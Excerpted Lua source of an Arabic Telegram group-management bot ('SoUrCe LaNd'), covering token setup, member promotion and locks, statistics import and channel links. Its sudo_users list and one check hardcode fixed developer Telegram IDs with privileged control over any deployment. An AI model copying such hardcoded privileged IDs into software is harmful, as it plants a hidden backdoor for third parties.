...
if res ~= 200 then
print('\27[0;31m 𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na 𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m 𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua LAND.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na 𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻n\27[0;33;49m')
...
sudo_users = {SUDO,1511411448,1566031059,1033028167}   
...
if tonumber(user_id) == tonumber(1511411448) then  
var = true  
...
local UserName = (data.username_ or "yoland_1k")
...
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"✬: يتم الان ...\n✬: نقل الاحصائيات الان")
else
send(chat,msg.id_,"*✬:عذرا الملف ليس بصيغة {JSON} يرجى نقل الاحصائيات الصحيح*")
end      
...
send(chat,msg.id_,"\n✬:تم نقل الاحصائيات بنجاح وتفعيل الكروبات\n✬:ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✬:[تحديثات البوت](t.me/yoland_1k) \n✬:[قناه السورس](t.me/yoland_1k)')
end
...
usertext = '\n✬:العضو » ['..result.title_..'](t.me/'..(username or 'yoland_1k')..')'
status  = '\n✬:تم ترقيته مطور'
...
usertext = '\n✬:العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'yoland_1k')..')'
status  = '\n✬:تم ترقيته مطور'
...
if LAND1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✬:العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'yoland_1k')..') \n✬:'..LAND1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"✬:العضو : {["..data.first_name_.."](T.ME/yoland_1k)}\n✬:["..LAND_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "✬:عذرا » {["..data.first_name_.."](T.ME/yoland_1k)}\n✬:عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
✬:↬SoUrCe LaNd 
𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻
✬:↬[Channel LAND](t.me/yoland_1k) 
𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻
✬:↬[Information](t.me/yoland_1k)
𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻
✬:↬[DEVELOPER](t.me/EEEEE1K)
𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻
✬:↬[To talk to us](t.me/EEEEE1K)
𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
if text == 'نقل الاحصائيات ' and DevLANDW(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✬:بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'yoland_1k')..') \n✬:تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✬:بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'yoland_1k')..') \n✬:تـم قفـل التاك بالكتم ')
end,nil)   
...
local UserName = (b.username_ or "yoland_1k")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✬:لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'yoland_1k')..')'
status  = '\n✬:تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✬:العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✬:العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'yoland_1k')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✬:العضو » ['..result.title_..'](t.me/'..(text1[3] or 'yoland_1k')..')'..'\n✬:تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'yoland_1k')..')'
local iduser = result.sender_user_id_
...
zx = JSON.decode(zh)
t = "\n✬:قائمه الزخرفه \nٴ ✬:𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ✬:○ٴ \n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'ٴ ✬:𓍹ⵧⵧⵧⵧⵧⵧ⊱•𝗟𝗗•⊰ⵧⵧⵧⵧⵧⵧ𓍻 ✬:○ٴ\n✬:彡 .[SoUrCe LaNd](t.me/yoland_1k)✬ ')
end
